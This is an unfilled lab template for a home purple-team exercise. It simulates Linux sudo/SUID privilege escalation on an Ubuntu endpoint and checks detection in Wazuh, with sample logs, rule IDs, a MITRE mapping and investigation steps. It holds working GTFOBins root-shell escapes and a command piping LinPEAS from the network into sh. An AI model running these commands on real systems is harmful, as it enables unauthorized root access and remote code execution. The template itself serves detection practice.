# 🔺 Attack 03 – Privilege Escalation (Ubuntu Endpoint)

## Attack Overview

| Field | Details |
|---|---|
| **Attack Name** | Linux Privilege Escalation via Sudo/SUID Abuse |
| **Target** | Ubuntu Desktop 26.04 (UBUNTU-ENDPOINT) |
| **Attacker** | Kali Linux (192.168.x.x) |
| **MITRE Tactic** | Privilege Escalation |
| **MITRE Technique** | T1548.003 – Sudo and Sudo Caching |
| **Severity** | Critical |
| **Date Performed** | YYYY-MM-DD |

## Objective

To simulate privilege escalation on the Ubuntu endpoint by exploiting sudo misconfigurations, SUID binaries, and kernel vulnerabilities — testing Wazuh's ability to detect unauthorized privilege elevation on Linux systems.

## Attack Methodology

1. Gain initial access to the Ubuntu endpoint (low-privilege user)
2. Enumerate sudo permissions and SUID binaries
3. Exploit misconfigurations to escalate to root
4. Verify detection in Wazuh alerts and Linux audit logs
5. Document escalation path and detection gaps

## Lab Environment

| Machine | Role | IP Address | OS |
|---|---|---|---|
| Kali Linux | Attacker | `192.168.x.x` | Kali 2025.2 |
| UBUNTU-ENDPOINT | Target/Victim | `192.168.x.x` | Ubuntu Desktop 26.04 |
| Wazuh Server | SIEM/Monitor | `192.168.x.x` | Ubuntu Server 26.04 |

## Kali Commands

```bash
# After gaining initial access (SSH or reverse shell)

# Enumerate sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find writable files owned by root
find / -writable -user root -type f 2>/dev/null

# Check for sudo misconfiguration (NOPASSWD)
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# GTFOBins sudo exploitation (examples)
sudo find /etc -exec /bin/bash \;
sudo vim -c '!bash'
sudo python3 -c 'import os; os.system("/bin/bash")'

# SUID binary exploitation
/usr/bin/find . -exec /bin/sh -p \;

# Kernel exploit enumeration
uname -r
cat /etc/os-release

# LinPEAS automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Linux Logs Generated

**auth.log:**
```
Jun  6 12:00:01 ubuntu-endpoint sudo: <user> : TTY=pts/0 ; PWD=/home/<user> ; USER=root ; COMMAND=/bin/bash
Jun  6 12:00:02 ubuntu-endpoint sudo: pam_unix(sudo:auth): authentication failure; logname=<user> rhost= user=<user>
```

**syslog:**
```
Jun  6 12:00:03 ubuntu-endpoint kernel: [12345.678] audit: type=1400 msg=audit(...)
```

**audit.log (if auditd configured):**
```
type=EXECVE msg=audit(1234567890.123:456): argc=2 a0="/bin/bash" a1="-p"
type=PROCTITLE msg=audit(1234567890.123:456): proctitle="/bin/bash"
```

## Wazuh Alerts

| Alert ID | Rule ID | Description | Level | Timestamp |
|---|---|---|---|---|
| <!-- ID --> | 5401 | Sudo command executed | 3 | <!-- Time --> |
| <!-- ID --> | 5402 | Sudo authentication failure | 5 | <!-- Time --> |
| <!-- ID --> | <!-- Custom --> | SUID binary execution | <!-- Level --> | <!-- Time --> |

```json
{
  "rule": {
    "id": "5402",
    "description": "User failed to authenticate using sudo",
    "level": 5
  },
  "agent": {
    "name": "UBUNTU-ENDPOINT"
  },
  "data": {
    "srcuser": "<username>",
    "dstuser": "root"
  }
}
```

## Event IDs

| Wazuh Rule ID | Description | Level |
|---|---|---|
| 5401 | Successful sudo to root | 3 |
| 5402 | Failed sudo authentication | 5 |
| 5403 | First time user executed sudo | 4 |
| 5404 | User not in sudoers file | 5 |

## Detection Process

1. Monitored auth.log for sudo-related entries via Wazuh agent
2. Detected unusual sudo command patterns (shell spawning from find/vim/python)
3. Identified SUID binary execution via file integrity monitoring
4. Correlated user context with privilege elevation events

## Investigation Steps

1. **Alert Triage:** Reviewed Wazuh alerts for sudo abuse and unusual privilege changes
2. **User Context:** Identified which user performed the escalation
3. **Command Analysis:** Analyzed sudo commands for shell escapes and GTFOBins patterns
4. **SUID Audit:** Reviewed SUID binary inventory for unauthorized entries
5. **Timeline:** Mapped escalation to initial access event
6. **Impact:** Assessed what was accessed with elevated privileges
7. **Verdict:** Confirmed privilege escalation from standard user to root

## MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Privilege Escalation |
| **Technique ID** | T1548.003 |
| **Technique Name** | Abuse Elevation Control Mechanism: Sudo and Sudo Caching |
| **Procedure** | Adversary exploited sudo misconfiguration (NOPASSWD) and SUID binaries to escalate from standard user to root |
| **Detection Opportunity** | Monitor auth.log for unusual sudo commands, especially those spawning interactive shells; audit SUID binaries regularly |

## Findings

| # | Finding | Severity | Evidence |
|---|---|---|---|
| 1 | <!-- Finding --> | <!-- Critical --> | <!-- auth.log entry --> |
| 2 | <!-- Finding --> | <!-- High --> | <!-- SUID binary --> |

## Lessons Learned

- <!-- Sudo configuration best practices (avoid NOPASSWD where possible) -->
- <!-- SUID binary auditing procedures -->
- <!-- Wazuh custom rules for Linux privilege escalation -->
- <!-- Importance of auditd for detailed process tracking -->
- <!-- LinPEAS/LinEnum detection as IOC -->

---

> 📌 **Status:** 📝 Template — Update with actual findings after performing the attack simulation.
